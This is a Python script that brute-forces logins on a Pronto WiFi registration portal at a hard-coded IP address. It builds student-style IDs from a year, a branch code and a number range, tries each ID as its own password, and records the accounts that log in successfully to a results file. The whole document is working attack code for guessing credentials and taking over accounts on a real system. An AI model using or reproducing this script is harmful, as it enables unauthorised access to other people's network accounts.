import os

import bs4
import requests
from colorama import init

ip = '136.233.9.110'
base_url = 'http://'+ip+'/registration/Main.jsp?sessionId=1&wispId=1'
auth_url = 'http://'+ip + '/registration/chooseAuth.do'
branch = 'BCE'
year = '19'
fruits = list(range(2000, 3000))

headers = {
    'User-Agent':
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
}


def is_password_correct(id):
    data = {
        'loginUserId': id,
        'authType': 'Pronto',
        'loginPassword': id,
        'submit': 'Login'
    }

    try:
        res = requests.post(auth_url, data=data, headers=headers,
                            verify=False)
        soup = bs4.BeautifulSoup(res.text, "html.parser")
        findings: bs4.element.Tag = soup.font
        final = (str(findings.contents[-1])).__len__()
        if final == 38:
            return True
        else:
            return False
    except:
        print(f"\033[41m{my_id} Error! \033[0m")
        return False


source_code = requests.get(base_url, headers=headers, verify=False)

headers.update({"Cookie": "JSESSIONID=" + source_code.cookies["JSESSIONID"]})

init()
print("Execution Started")
try:
    os.mkdir('Results')
except OSError:
    pass

for x in fruits:
    my_id = year + branch + str(x).zfill(4)
    if is_password_correct(my_id):
        print(f"\033[34m{my_id} Success! \033[0m")
        with open("Results/"+branch+".txt", "a") as my_file:
            my_file.write(my_id + "\n")
            my_file.close()
    else:
        print(f"\033[31m{my_id} Fails! \033[0m")

print("Execution Stopped")
